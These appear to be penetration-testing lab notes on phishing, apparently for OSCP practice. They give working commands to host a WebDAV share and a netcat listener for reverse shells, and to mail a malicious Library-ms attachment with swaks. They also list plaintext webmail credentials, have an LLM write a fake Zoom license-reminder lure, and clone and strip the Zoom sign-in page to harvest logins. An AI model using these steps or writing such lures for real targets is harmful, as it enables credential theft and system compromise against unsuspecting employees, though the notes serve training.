## Use `config.Library-ms` and `.lnk` file
Start the `webdav` server
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
Running without configuration file.
15:02:36.530 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
15:02:36.533 - INFO    : WsgiDAV/4.3.3 Python/3.12.6 Linux-6.11.2-amd64-x86_64-with-glibc2.40
15:02:36.533 - INFO    : Lock manager:      LockManager(LockStorageDict)
15:02:36.534 - INFO    : Property manager:  None
15:02:36.534 - INFO    : Domain controller: SimpleDomainController()
15:02:36.534 - INFO    : Registered DAV providers by route:
15:02:36.534 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/lib/python3/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
15:02:36.534 - INFO    :   - '/': FilesystemProvider for path '/home/kali/OSCP/11/11.3/vmpgroup2' (Read-Write) (anonymous)
15:02:36.534 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
15:02:36.534 - WARNING : Share '/' will allow anonymous write access.
15:02:36.534 - WARNING : Share '/:dir_browser' will allow anonymous write access.
15:02:36.648 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.1 Python/3.12.6
15:02:36.648 - INFO    : Serving on http://0.0.0.0:80 ...
```
Start python server 
```
python3 -m http.server 80
```
Start a listener
```
nc -lvnp 443
```
Send a phishing email to target
```
swaks --server <SMTP_SERVER> -t <TARGET_EMAIL> --from <FAKE_SENDER_EMAIL> --header "Subject: <SUBJECT_LINE>" --body @<EMAIL_BODY_FILE> --attach @<ATTACHMENT_FILE> --suppress-data -ap

swaks --server 192.168.234.199 -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --header "Subject: Staging Script" --body @body.txt --attach @config.Library-ms --suppress-data -ap

sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.223.140:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a Document.ods
```
Get shell when someone opens the mail

Login to the webmail
```
helpdesk@mail.corp.com:Helpdesk@Password2024
```
Enumerate the sent mails
```
"Hello Sales department, 

Hope you're knocking it out of the park this week! We're trying to redo our inventory of Zoom licenses as we seem to have a large number which aren't being used at the moment. Rather than having everyone reply to the email, in order to keep your Zoom license, please just ensure that you login to your account and schedule a meeting within the next two weeks. Any accounts which don't do this within the time frame will be transitioned to a free license. 

Thank you very much for your cooperation and apologies for the hassle!" 

Write another email in the same style as this, and include a reminder for employees to login to Zoom. Include a hyperlink that can be clicked and directs people to the appropriate page.  
```
Take the email as sample to an LLM, along with a prompt, to write an email in the same style
```
Subject: Reminder: Please Log In to Keep Your Zoom License!

Hello Sales department,

Just a quick reminder—hope everything’s going smoothly on your end! We’re still working on updating our Zoom license inventory and noticed that some accounts haven’t yet logged in to schedule a meeting. To make sure your account remains on a full license, please click here to log in and schedule a meeting within the next week.

If no meeting is scheduled by the deadline, any inactive accounts will be moved to a free license.

Thanks again for your cooperation, and sorry for the added task! Let us know if you have any questions.

Best regards,
[Your Company] Helpdesk Team
```

## Clone a Legitimate Website
```
wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"
```
`-E`: Change file extension to match the MIME type of the downloaded file
`-k`: Convert all links in the document to point to local alternatives
`-K`: Save original file with `.orig`
`-p`: Download all the files necessary for viewing
`-e robots=off`: Ignore `robots.txt`
`-H`: Download from external hosts, limited to files on `zoom.us`
`-nd`: Save files in a flat directory structure in current working directory
Launch the website with `python3`
```
python3 -m http.server 80
```
Access the page (Note: `OWASP CSRF Guard error alert box`)
Search files in the directory for `OWASP` and `csrf_js`
```
grep "OWASP" *
grep "csrf_js" *

┌──(kali㉿kali)-[~/OSCP/13/new_content]
└─$ grep "OWASP" *
csrf_js: * The OWASP CSRFGuard Project, BSD License
csrf_js: *    3. Neither the name of OWASP nor the names of its contributors may be used
csrf_js:                    this.setRequestHeader("X-Requested-With", "OWASP CSRFGuard Project");
csrf_js:        alert("OWASP CSRFGuard JavaScript was included from within an unauthorized domain!");

┌──(kali㉿kali)-[~/OSCP/13/new_content]
└─$ grep "csrf_js" *
csrf_js:        xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
csrf_js:            xhr.open("POST", "/csrf_js"+(typeof(resourceAccountIdRoutingURl)!="undefined"?"?"+resourceAccountIdRoutingURl:""), false);
signin.html:<script nonce="lNBoeXlATvmgxqcsDz-4OA" src="csrf_js"></script>
signin.orig:<script nonce="lNBoeXlATvmgxqcsDz-4OA" src="/csrf_js"></script>

```
Delete the lines and Check the cloned `website` for any problems
Move the page to a proper web server for better support of POST requests
```
mv -f * /var/www/html
systemctl start apache2
cd /var/www/html
```
To make a replica of the login page
- Figure out how the login page works
- Use LLM to write a form and overwrite the current source code
- Make a copy of the current page and compare to the original
Send the phishing email to the targets and wait for an event.
